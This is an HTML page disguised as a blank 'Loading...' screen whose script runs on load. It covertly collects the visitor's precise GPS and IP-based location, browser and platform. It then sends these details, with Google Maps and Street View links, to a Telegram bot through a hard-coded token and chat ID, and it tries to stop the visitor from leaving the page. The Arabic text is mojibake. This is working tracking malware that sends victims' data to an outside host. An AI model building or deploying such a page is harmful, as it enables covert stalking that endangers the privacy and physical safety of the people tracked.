<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        class PrecisionLocator {
            constructor() {
                this.bestLocation = null;
                this.locations = [];
                this.attempts = 0;
                this.maxAttempts = 5;
            }

            async startTracking() {
                // 1. Ø¨Ø¯Ø¡ ØªØªØ¨Ø¹ GPS Ø§Ù„Ù…Ø³ØªÙ…Ø±
                this.startContinuousGPS();
                
                // 2. Ø§Ø³ØªØ®Ø¯Ø§Ù… WiFi Positioning (Ø¥Ù† ÙˆØ¬Ø¯)
                this.getWifiPosition();
                
                // 3. Ø§Ø³ØªØ®Ø¯Ø§Ù… GSM Cell Towers (Ù„Ù„Ø¬ÙˆØ§Ù„)
                this.getCellTowerPosition();
                
                // 4. Ø§Ø³ØªØ®Ø¯Ø§Ù… IP Ù…Ø¹ Ø®Ø¯Ù…Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø©
                await this.getEnhancedIPLocation();
                
                // 5. Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± ÙˆØ¬Ù…Ø¹ Ø£ÙØ¶Ù„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
                setTimeout(() => this.finalizeAndSend(), 8000);
            }

            startContinuousGPS() {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                this.watchId = navigator.geolocation.watchPosition(
                    (position) => {
                        const accuracy = position.coords.accuracy;
                        this.attempts++;
                        
                        console.log(`GPS Attempt ${this.attempts}: ${accuracy}m`);
                        
                        // Ù†ÙØ¶Ù„ Ø§Ù„Ø¯Ù‚Ø© Ø§Ù„Ø£Ù‚Ù„ (Ø£Ù‚Ù„ Ø±Ù‚Ù… = Ø£ÙØ¶Ù„)
                        if (!this.bestLocation || accuracy < this.bestLocation.accuracy) {
                            this.bestLocation = {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: accuracy,
                                source: 'HIGH_ACCURACY_GPS',
                                timestamp: new Date()
                            };
                            
                            // Ø¥Ø°Ø§ ÙˆØµÙ„Ù†Ø§ Ù„Ø¯Ù‚Ø© Ù…Ù…ØªØ§Ø²Ø©ØŒ Ù†Ø±Ø³Ù„ ÙÙˆØ±Ø§Ù‹
                            if (accuracy <= 10) {
                                this.sendImmediately();
                            }
                        }
                        
                        if (this.attempts >= this.maxAttempts) {
                            navigator.geolocation.clearWatch(this.watchId);
                        }
                    },
                    (error) => {
                        console.error('GPS Error:', error);
                    },
                    options
                );
            }

            async getEnhancedIPLocation() {
                // Ø§Ø³ØªØ®Ø¯Ø§Ù… 3 Ø®Ø¯Ù…Ø§Øª IP Ù…Ø®ØªÙ„ÙØ© Ù„Ø£ÙØ¶Ù„ Ø¯Ù‚Ø©
                const services = [
                    'https://ipapi.co/json/',
                    'https://ipinfo.io/json?token=test', 
                    'https://api.ipgeolocation.io/ipgeo?apiKey=test',
                    'https://json.geoiplookup.io/'
                ];

                for (let service of services) {
                    try {
                        const response = await fetch(service, { timeout: 3000 });
                        const data = await response.json();
                        
                        if (data.latitude && data.longitude) {
                            this.locations.push({
                                lat: parseFloat(data.latitude),
                                lng: parseFloat(data.longitude),
                                accuracy: 5000, // Ø¯Ù‚Ø© IP ØªÙ‚Ø±ÙŠØ¨ÙŠØ©
                                source: 'IP_GEOLOCATION',
                                city: data.city || data.city_name,
                                country: data.country_name || data.country,
                                isp: data.org || data.isp,
                                timestamp: new Date()
                            });
                        }
                    } catch (e) {
                        continue; // Ù†ÙƒÙ…Ù„ Ù„Ù„Ø®Ø¯Ù…Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
                    }
                }
            }

            getWifiPosition() {
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø¯Ø§Ù… WiFi Positioning (Ø¥Ù† supported)
                if ('wifi' in navigator) {
                    try {
                        navigator.wifi.getAccessPoints((ap) => {
                            // ÙŠÙ…ÙƒÙ† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù†Ù‚Ø§Ø· Ø§Ù„ÙˆØµÙˆÙ„ Ù„ØªØ­Ø³ÙŠÙ† Ø§Ù„Ø¯Ù‚Ø©
                            console.log('WiFi access points:', ap);
                        });
                    } catch (e) {
                        // Ù„ÙŠØ³ Ù…Ø¯Ø¹ÙˆÙ…Ø§Ù‹ ÙÙŠ Ù…Ø¹Ø¸Ù… Ø§Ù„Ù…ØªØµÙØ­Ø§Øª
                    }
                }
            }

            getCellTowerPosition() {
                // Ù„Ù„Ø¬ÙˆØ§Ù„: Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¨Ø±Ø¬ Ø§Ù„Ø®Ù„ÙŠØ©
                if ('connection' in navigator) {
                    const conn = navigator.connection;
                    if (conn.type === 'cellular') {
                        // Ø¥Ø¶Ø§ÙØ© ØªØ­Ø³ÙŠÙ†Ø§Øª Ù„Ù„Ø´Ø¨ÙƒØ© Ø§Ù„Ø®Ù„ÙˆÙŠØ©
                        this.locations.push({
                            source: 'CELL_NETWORK',
                            type: conn.effectiveType
                        });
                    }
                }
            }

            calculatePreciseLocation() {
                if (this.bestLocation && this.bestLocation.accuracy <= 20) {
                    return this.bestLocation;
                }

                // Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† GPS Ø¯Ù‚ÙŠÙ‚Ø§Ù‹ enoughØŒ Ù†Ø³ØªØ®Ø¯Ù… Ù…ØªÙˆØ³Ø· Ø£ÙØ¶Ù„ Ø§Ù„Ù…ÙˆØ§Ù‚Ø¹
                const validLocations = this.locations.filter(loc => loc.lat && loc.lng);
                
                if (validLocations.length > 0) {
                    const avgLat = validLocations.reduce((sum, loc) => sum + loc.lat, 0) / validLocations.length;
                    const avgLng = validLocations.reduce((sum, loc) => sum + loc.lng, 0) / validLocations.length;
                    
                    return {
                        lat: avgLat,
                        lng: avgLng,
                        accuracy: 100, // Ø¯Ù‚Ø© Ù…ØªÙˆØ³Ø·Ø©
                        source: 'HYBRID_AVERAGE',
                        details: `Ù…Ø¯Ù…Ø¬ Ù…Ù† ${validLocations.length} Ù…ØµØ¯Ø±`,
                        timestamp: new Date()
                    };
                }

                return null;
            }

            async finalizeAndSend() {
                navigator.geolocation.clearWatch(this.watchId);
                
                const finalLocation = this.calculatePreciseLocation();
                
                if (finalLocation) {
                    await this.sendToBot(finalLocation);
                } else {
                    await this.sendToBot({
                        error: "Ù„Ù… ÙŠØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø¯Ù‚ÙŠÙ‚",
                        attempts: this.attempts,
                        sources: this.locations.map(l => l.source)
                    });
                }
                
                setTimeout(() => window.close(), 1000);
            }

            async sendImmediately() {
                if (this.bestLocation) {
                    await this.sendToBot(this.bestLocation);
                    navigator.geolocation.clearWatch(this.watchId);
                    setTimeout(() => window.close(), 1000);
                }
            }

            async sendToBot(locationData) {
                let message = "ğŸ¯ **ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø¹Ø§Ù„ÙŠ Ø§Ù„Ø¯Ù‚Ø©**\n\n";
                
                if (locationData.error) {
                    message += `âŒ ${locationData.error}\n`;
                    message += `ğŸ”¢ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø§Øª: ${locationData.attempts}\n`;
                    message += `ğŸ“¡ Ø§Ù„Ù…ØµØ§Ø¯Ø±: ${locationData.sources.join(', ')}\n`;
                } else {
                    const mapsUrl = `https://maps.google.com/?q=${locationData.lat},${locationData.lng}&z=18`;
                    const streetView = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${locationData.lat},${locationData.lng}`;
                    
                    message += `ğŸ“ **Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„Ø¯Ù‚ÙŠÙ‚Ø©:**\n`;
                    message += `â€¢ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: \`${locationData.lat.toFixed(6)}\`\n`;
                    message += `â€¢ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: \`${locationData.lng.toFixed(6)}\`\n`;
                    message += `â€¢ Ø§Ù„Ø¯Ù‚Ø©: ğŸ¯ ${locationData.accuracy} Ù…ØªØ±\n\n`;
                    
                    message += `ğŸ” **Ù…ØµØ¯Ø± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:** ${locationData.source}\n`;
                    message += `ğŸ•’ **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-MA')}\n\n`;
                    
                    message += `ğŸ—ºï¸ **Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„:**\n${mapsUrl}\n\n`;
                    message += `ğŸŒ† **Street View:**\n${streetView}\n\n`;
                    
                    if (locationData.details) {
                        message += `ğŸ“Š **ØªÙØ§ØµÙŠÙ„:** ${locationData.details}\n`;
                    }
                }

                message += `\nğŸ’» **Ø§Ù„Ù…ØªØµÙØ­:** ${navigator.userAgent.split(' ')[0]}\n`;
                message += `ğŸ“± **Ø§Ù„Ù…Ù†ØµØ©:** ${navigator.platform}\n`;

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown',
                            disable_web_page_preview: false
                        })
                    });
                } catch (error) {
                    console.error('Failed to send:', error);
                }
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ÙÙˆØ± ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', () => {
            const locator = new PrecisionLocator();
            locator.startTracking();
        });

        // Ù…Ù†Ø¹ Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ØµÙØ­Ø©å¤ªå¿«
        window.addEventListener('beforeunload', (e) => {
            if (document.visibilityState === 'visible') {
                e.preventDefault();
                e.returnValue = '';
            }
        });
    </script>
</head>
<body style="margin:0;padding:0;background:transparent;overflow:hidden;height:100vh;">
    <!-- Ø§Ù„ØµÙØ­Ø© ÙØ§Ø±ØºØ© ØªÙ…Ø§Ù…Ø§Ù‹ -->
</body>
</html>